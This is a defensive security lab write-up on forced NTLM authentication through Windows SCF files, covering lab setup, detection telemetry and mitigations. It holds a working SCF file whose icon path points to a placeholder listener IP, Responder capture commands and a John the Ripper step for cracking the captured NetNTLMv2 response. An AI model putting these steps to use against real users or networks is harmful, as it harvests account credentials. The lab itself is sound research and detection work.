---
title: "SCF Forced NTLM Authentication: Controlled Validation and Detection"
summary: "A controlled SCF-file lab for testing remote icon-triggered NTLM authentication, separating legacy Chrome behavior from current Windows exposure and defensive telemetry."
category: "Windows Security"
labType: "security-research"
status: "planned"
difficulty: "Intermediate"
duration: "45–60 minutes"
environment:
  - "Isolated Windows 10/11 virtual machine"
  - "Kali Linux virtual machine"
  - "Host-only virtual network"
  - "Dummy local Windows account"
publishedAt: 2026-09-03T12:00:00Z
updatedAt: 2026-09-03T12:00:00Z
tags:
  - "SCF"
  - "Forced Authentication"
  - "NetNTLMv2"
  - "Windows Explorer"
  - "SMB"
  - "Responder"
  - "Detection Engineering"
tools:
  - "PowerShell"
  - "Windows Explorer"
  - "Responder"
  - "tcpdump"
  - "Sysmon"
mitre:
  - "T1187 — Forced Authentication"
sourceName: "John Hammond — SCF credential-capture demonstration transcript"
visualLeft: "SCF"
visualRight: "NTLM"
visualProcess: "explorer.exe"
featured: true
draft: false
---

> **Controlled lab use only.** Run this experiment only on isolated virtual machines that you own or are explicitly authorized to test. Use a disposable Windows account with a unique lab-only password. Never place the test file on a production desktop, shared drive or third-party system.

<div class="research-state">
  <strong>Research status:</strong> this is a source-backed validation blueprint. The supplied transcript demonstrates SCF-triggered credential capture in a controlled environment, while a read-only check confirmed that the SCF file class and its hidden-extension registration remain present on a current Windows 25H2 host. No personal NetNTLMv2 capture, packet trace or current-build trigger result was supplied, so this article does not claim that the network coercion phase has been reproduced locally.
</div>

## Executive summary

Windows Shell Command Files use the <code>.scf</code> extension and can define an icon through an <code>IconFile</code> entry. Historic attack demonstrations point that icon at an SMB or WebDAV resource controlled by a tester. When File Explorer renders the directory, Windows may try to retrieve the remote resource and automatically authenticate as the current user.

That behavior is an example of [MITRE ATT&CK T1187 — Forced Authentication](https://attack.mitre.org/techniques/T1187/). The material exposed to a listener is normally a NetNTLM challenge-response, not the user's plaintext password and not the reusable NT hash stored by Windows.

This distinction is important:

~~~text
SCF file appears in Explorer
        ↓
Explorer resolves a remote icon
        ↓
SMB or WebDAV authentication may be attempted
        ↓
The listener may receive a NetNTLM challenge-response
        ↓
Offline password guessing or NTLM relay may be possible under separate conditions
~~~

The browser-delivery chain shown in older demonstrations is not a current Chrome vulnerability. Google fixed CVE-2024-1675, described as insufficient policy enforcement in downloads, in Chrome 122 during February 2024. The underlying forced-authentication risk still matters where a crafted file reaches the filesystem and outbound NTLM remains available.

| Field | Value |
| --- | --- |
| Validation state | Research blueprint — network trigger validation pending |
| Technique | Remote icon reference in a Windows SCF file |
| Primary risk | Forced SMB/WebDAV authentication and NetNTLMv2 exposure |
| Required user action | Directory rendering may be sufficient on affected configurations |
| Modern browser status | Chrome delivery issue fixed in version 122 |
| Detection focus | <code>explorer.exe</code> network activity, NTLM auditing and outbound SMB |

## Research objective

The lab is designed to answer five questions without weakening a production endpoint:

1. Does the current Windows build still register <code>.scf</code> as a Shell Command File?
2. Does the registration still contain <code>NeverShowExt</code>?
3. Does rendering a controlled SCF file generate traffic to the isolated Kali listener?
4. If authentication occurs, what protocol and credential material are exposed?
5. Which host and network controls prevent or record the behavior?

The goal is validation and detection engineering. Obtaining remote access, relaying credentials into another service or targeting a real account is outside the scope of this lab.

## Evidence boundary

The article separates supplied evidence from steps that still require execution:

| Claim | Evidence status |
| --- | --- |
| An SCF file can reference a remote icon | Demonstrated in the supplied John Hammond transcript |
| The source demonstration captured NetNTLMv2 with Responder | Demonstrated in the transcript, not independently reproduced here |
| <code>SHCmdFile</code> remains registered on Windows 25H2 | Confirmed through a read-only registry check during this research |
| <code>NeverShowExt</code> remains present | Confirmed through the same read-only check |
| A current patched Windows build sends authentication for this exact SCF | Not tested; treat as the primary validation question |
| The historical Chrome drag-and-drop delivery still works | No; CVE-2024-1675 was fixed in Chrome 122 |
| A proposed detection generated an alert | Not tested; telemetry guidance must be validated locally |

Do not convert an expected result into an observed result. A modern endpoint that produces no connection is a valid and useful outcome.

## Lab topology

<div class="attack-flow" role="img" aria-label="Isolated SCF forced-authentication validation flow">
  <span>Kali listener on a host-only virtual network</span>
  <span>Windows VM with a dummy local account</span>
  <span>SCF points only to the Kali lab IP</span>
  <span>Explorer renders the controlled directory</span>
  <span>Traffic and host telemetry are reviewed</span>
  <span>The file, capture and account are destroyed</span>
</div>

Use a host-only virtual switch with no route to the Internet:

- **Windows VM:** test client at <code>&lt;WINDOWS_LAB_IP&gt;</code>.
- **Kali VM:** controlled SMB listener at <code>&lt;KALI_LAB_IP&gt;</code>.
- **Hypervisor:** host-only switch with no Internet gateway.

### Prerequisites

- A snapshot of both virtual machines.
- A dummy Windows local user created only for this experiment.
- A password that is never used outside the lab.
- Kali Linux with Responder installed.
- Optional Sysmon installation for network-connection telemetry.
- Administrative access for the defensive-control phase only.

Do not join the Windows VM to a real Active Directory domain. Do not reuse a personal Microsoft account or corporate identity.

## Technical background

### SCF files and hidden extensions

SCF files are text-based Windows shell instructions. A minimal file can define a command and an icon source:

~~~ini
[Shell]
Command=2
IconFile=\\<KALI_LAB_IP>\share\lab.ico

[Taskbar]
Command=ToggleDesktop
~~~

The notable property is not arbitrary code execution. It is the remote icon path. File Explorer may resolve that path while preparing the directory view, before the user deliberately opens the file.

The supplied source also highlights that Windows registers the SCF class with <code>NeverShowExt</code>. This can make a crafted file appear more convincing even when Explorer is configured to display normal filename extensions. The lab checks the registry directly instead of relying only on the visual result.

### What NetNTLMv2 is—and is not

An SMB listener may receive a NetNTLMv2 challenge-response containing the username, host or domain context and cryptographic response material. It does **not** receive the cleartext password.

NetNTLMv2 is also different from an NT hash:

- Offline guessing tests candidate passwords against the captured challenge-response.
- NTLM relay forwards a live authentication exchange to a compatible service when signing and other protections permit it.
- Classic pass-the-hash normally uses an NT hash, not a captured NetNTLMv2 response.

This lab stops after confirming the isolated authentication attempt. Relay and post-exploitation are intentionally excluded.

## Step 1 — Record the Windows baseline

Open PowerShell on the Windows VM and capture the operating-system version:

~~~powershell
Get-ComputerInfo |
  Select-Object WindowsProductName, WindowsVersion, OsBuildNumber
~~~

Record the active network profile and verify that only the host-only lab adapter is connected:

~~~powershell
Get-NetConnectionProfile |
  Select-Object InterfaceAlias, NetworkCategory, IPv4Connectivity

Get-NetIPAddress -AddressFamily IPv4 |
  Where-Object IPAddress -NotLike '127.*' |
  Select-Object InterfaceAlias, IPAddress, PrefixLength
~~~

If the VM has Internet access or a corporate VPN adapter, stop and correct the topology before proceeding.

## Step 2 — Inspect the SCF registration safely

The following command is read-only. It checks whether the SCF class exists and whether Windows still marks its extension as hidden:

~~~powershell
$ScfClass = Get-ItemProperty \
  -LiteralPath 'Registry::HKEY_CLASSES_ROOT\SHCmdFile' \
  -ErrorAction SilentlyContinue

[pscustomobject]@{
  ClassExists  = [bool]$ScfClass
  NeverShowExt = ($null -ne $ScfClass.PSObject.Properties['NeverShowExt'])
}
~~~

A result of <code>True</code> for both fields confirms the file association and hidden-extension registration. It does not prove that remote icon resolution or authentication will occur.

## Step 3 — Prepare the isolated listener

On Kali, identify the host-only interface:

~~~bash
ip -brief address
~~~

Replace <code>&lt;LAB_INTERFACE&gt;</code> with the interface attached to the host-only network. Start Responder only after confirming that the interface cannot reach production systems:

~~~bash
sudo responder -I <LAB_INTERFACE> -v
~~~

Responder starts several protocol listeners. In this lab it is used only to observe traffic generated by the dedicated Windows VM. Do not run it on a corporate, campus, public or household network containing unrelated devices.

For a protocol-only view, a second Kali terminal can record SMB traffic without printing credential material:

~~~bash
sudo tcpdump -ni <LAB_INTERFACE> \
  'host <WINDOWS_LAB_IP> and tcp port 445'
~~~

Keep the initial output as the negative control: before the SCF file is created, there should be no matching connection from the Windows VM.

## Step 4 — Create the controlled SCF file

On Windows, set the isolated Kali address and create the file in a dedicated lab directory rather than disguising it as a system object:

~~~powershell
$Lab = 'C:\Lab\SCF-Forced-Auth'
$KaliLabIp = '<KALI_LAB_IP>'
$ScfPath = Join-Path $Lab 'lab-remote-icon.scf'

New-Item -ItemType Directory -Path $Lab -Force | Out-Null

$ScfContent = @"
[Shell]
Command=2
IconFile=\\$KaliLabIp\share\lab.ico

[Taskbar]
Command=ToggleDesktop
"@

Set-Content -LiteralPath $ScfPath -Value $ScfContent -Encoding ASCII
Get-Item -LiteralPath $ScfPath | Select-Object FullName, Length, Extension
Get-Content -LiteralPath $ScfPath
~~~

The explicit <code>lab-remote-icon</code> name avoids reproducing the source video's social-engineering disguise. The security property under test is the remote icon reference, not whether a user can be fooled by a Recycle Bin graphic.

## Step 5 — Trigger only the directory-rendering test

With Responder and the optional packet capture visible on Kali:

1. Open <code>C:\Lab\SCF-Forced-Auth</code> in File Explorer.
2. Change between list and icon view, or press <kbd>F5</kbd> once.
3. Do not double-click the SCF file.
4. Observe Kali for a maximum of 30 seconds.
5. Close the Explorer window.

There are two equally valid results.

### Result A — No connection

No SMB packet or Responder event appears. Record:

- Windows edition and build.
- Current security updates.
- Whether outbound TCP 445 is blocked.
- Whether SMB client NTLM blocking is enabled.
- Whether Microsoft Defender or another security product quarantined the file.

Do not disable security controls merely to force the older behavior to succeed.

### Result B — Authentication reaches Kali

Responder may report an SMB authentication attempt containing a lab username and a NetNTLMv2 response. Preserve only a redacted record:

~~~text
[SMB] Client   : <WINDOWS_LAB_IP>
[SMB] Username : <LAB_HOST>\<LAB_USERNAME>
[SMB] NetNTLMv2: <REDACTED>
~~~

The validation claim is limited to this statement: rendering the controlled directory caused the Windows VM to authenticate to the isolated listener. It does not establish code execution or endpoint compromise.

Never publish the captured response. Even a lab capture is credential material until the dummy account and VM are destroyed.

## Step 6 — Optional lab-password validation

This phase is optional and should use only the deliberately weak, unique password assigned to the disposable account. It confirms the difference between capturing a challenge-response and recovering the password.

Place the single lab-only NetNTLMv2 line in <code>captured-netntlmv2.txt</code> and use a tiny custom wordlist containing only test candidates:

~~~bash
john --format=netntlmv2 \
  --wordlist=lab-passwords.txt \
  captured-netntlmv2.txt
~~~

Do not use leaked password collections, real account material or captures from systems outside this lab. Password recovery is not required to validate forced authentication.

## Step 7 — Review modern SMB controls

On the Windows VM, inspect the SMB client configuration:

~~~powershell
Get-SmbClientConfiguration |
  Select-Object EnableSecuritySignature, RequireSecuritySignature, BlockNTLM
~~~

Windows 11 24H2 and Windows Server 2025 introduced SMB client NTLM blocking. Microsoft documents the following administrative control on supported systems:

~~~powershell
Set-SmbClientConfiguration -BlockNTLM $true
~~~

Changing this setting can break access to legacy SMB servers. Audit dependencies and test in a controlled scope before enterprise deployment.

For a simple mitigation control inside the disposable VM, create a temporary outbound rule that blocks TCP 445, repeat Step 5 and verify that Kali receives no SMB connection:

~~~powershell
New-NetFirewallRule \
  -DisplayName 'SCF Lab - Block outbound SMB' \
  -Direction Outbound \
  -Action Block \
  -Protocol TCP \
  -RemotePort 445 \
  -Profile Any
~~~

Remove only the temporary rule after the comparison:

~~~powershell
Remove-NetFirewallRule -DisplayName 'SCF Lab - Block outbound SMB'
~~~

In production, Microsoft recommends blocking outbound TCP 445 to the Internet at the network edge while preserving explicitly required internal file services.

## Chrome delivery: historical context, not a current lab step

The source demonstration used an old Chromium build to reproduce a drag-and-drop/download path that placed an SCF file on the Windows filesystem. Google lists CVE-2024-1675 as fixed in Chrome 122.0.6261.57/.58.

This article does not provide an obsolete browser or instructions for bypassing certificate warnings. Reproducing the vulnerable browser delivery chain adds risk without improving the modern defensive result. The current lab begins only after a clearly named SCF file has been created locally by the authorized tester.

## Detection opportunities

### Network controls

The highest-value network signal is an unexpected connection from a workstation to TCP 445 outside approved file-server ranges. Hunt for:

- Workstation-to-Internet SMB.
- <code>explorer.exe</code> initiating a connection to an unapproved address.
- NTLM authentication directed to a non-domain or newly observed system.
- WebDAV traffic from Explorer to an unusual HTTP or HTTPS destination.

### Sysmon Event ID 3

When Sysmon network-connection logging is enabled, Event ID <code>3</code> can associate the destination with the initiating process. Review recent events involving Explorer:

~~~powershell
Get-WinEvent \
  -LogName 'Microsoft-Windows-Sysmon/Operational' \
  -MaxEvents 200 |
  Where-Object Id -eq 3 |
  Where-Object Message -Match 'Image: C:\\Windows\\explorer.exe' |
  Where-Object Message -Match 'DestinationPort: 445' |
  Select-Object TimeCreated, Id, Message
~~~

Sysmon Event ID 3 is disabled by default and depends on the deployed configuration. Absence of the event does not prove absence of the connection.

### NTLM operational log

If outgoing NTLM auditing is configured, review the operational log:

~~~powershell
Get-WinEvent \
  -LogName 'Microsoft-Windows-NTLM/Operational' \
  -MaxEvents 100 |
  Select-Object TimeCreated, Id, LevelDisplayName, Message
~~~

Correlate the event time with DNS, proxy, firewall and endpoint network telemetry. Do not alert on an event ID alone without validating the destination and business context.

### File telemetry

Monitor the creation of uncommon shell-reference formats in user-writable locations:

- <code>*.scf</code> in Desktop, Downloads and shared directories.
- Files whose shell metadata references a UNC or WebDAV path.
- A short interval between file creation and outbound authentication.
- Browser download events followed by Explorer access to the same directory.

This detection family should also consider <code>.url</code>, <code>.lnk</code> and document templates, but each format requires its own validation to control false positives.

## Troubleshooting and negative results

### Responder sees nothing

- Confirm both VMs use the same host-only network.
- Verify the placeholder was replaced with the Kali host-only IP.
- Check that Responder is bound to the correct interface.
- Use <code>tcpdump</code> to distinguish “no network request” from “Responder did not process the request.”
- Check whether outbound TCP 445 or NTLM is blocked.
- Record the negative result instead of weakening the endpoint.

### Explorer displays a generic icon

A generic icon does not prove that no remote lookup was attempted. Use the packet capture and host telemetry as the authoritative evidence.

### The extension is visible

Record the registry values and Explorer configuration. File-association behavior can change across Windows versions and organizational policy. The attack does not depend on the extension being visually hidden; that property primarily affects social engineering.

### Defender removes the file

Preserve the detection name, timestamp and affected path from Protection History. Do not exclude a production user directory or disable antivirus. If a narrow exception is absolutely required for controlled research, use only the disposable VM and remove the exception during cleanup.

## Cleanup and rollback

1. Stop Responder and <code>tcpdump</code> with <kbd>Ctrl+C</kbd>.
2. Delete <code>C:\Lab\SCF-Forced-Auth\lab-remote-icon.scf</code> from the Windows VM.
3. Remove the temporary firewall rule if it was created.
4. Destroy the lab-only capture and custom wordlist.
5. Delete or disable the dummy Windows account.
6. Revert both VMs to their clean snapshots.
7. Confirm that no host-only adapter gained an Internet route during the test.

Do not retain or publish the raw NetNTLMv2 response.

## Security considerations

The SCF file is not itself a general-purpose executable and the remote icon lookup is not equivalent to code execution. The risk is credential coercion and the downstream opportunities created by exposed authentication material.

Several controls affect the outcome:

- **Chrome updates** remove the specific historical delivery issue.
- **Outbound SMB filtering** prevents Internet-hosted SMB collection.
- **SMB client NTLM blocking** prevents NTLM use on supported modern systems.
- **SMB signing** substantially limits common relay paths but does not make credential exposure desirable.
- **Strong unique passwords** increase the cost of offline guessing.
- **WebDAV restrictions** reduce an alternative authentication channel when SMB is unavailable.
- **Endpoint telemetry** connects the unusual file, Explorer activity and network destination.

A capture is not proof that the account was compromised. Conversely, blocking TCP 445 alone does not address every forced-authentication path.

## Key findings and lessons learned

- The SCF file class and <code>NeverShowExt</code> registration can remain present on current Windows even when an older delivery exploit has been patched.
- Forced authentication is the security boundary under examination; the SCF file is only one possible trigger format.
- Modern Windows builds may block or alter the historical behavior, so current-version testing must preserve negative results.
- CVE-2024-1675 belongs to the old Chrome download path and was fixed in Chrome 122; it should not be presented as a current browser exploit.
- A NetNTLMv2 challenge-response is not a plaintext password or an NT hash.
- The most durable defense is to reduce NTLM, restrict outbound SMB/WebDAV and monitor unexpected authentication destinations.
- Reproducible security research requires an explicit evidence boundary: the source demonstration succeeded, while personal network-capture validation remains pending.

Related portfolio research:

- [Mark of the Web Forensics: Tracing Download Origins with NTFS Alternate Data Streams](/labs/windows/mark-of-the-web-forensics-tracing-download-origins/)
- [LNK–HTA Polyglot Lab: Code Execution, Detection & Persistence](/labs/windows/lnk-hta-polyglot-code-execution-detection-persistence/)
- [Bruteforcing Windows Defender Exclusions](/labs/windows/bruteforcing-windows-defender-exclusions/)

## References and attribution

- John Hammond — supplied SCF credential-capture demonstration transcript; exact video URL was not provided.
- [MITRE ATT&CK — T1187: Forced Authentication](https://attack.mitre.org/techniques/T1187/)
- [Google Chrome Releases — Chrome 122 and CVE-2024-1675](https://chromereleases.googleblog.com/2024/02/stable-channel-update-for-desktop_20.html)
- [Microsoft Learn — Block NTLM connections on SMB](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)
- [Microsoft Learn — Secure SMB traffic](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-secure-traffic)
- [Microsoft Learn — Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Responder — official GitHub repository](https://github.com/lgandx/Responder)
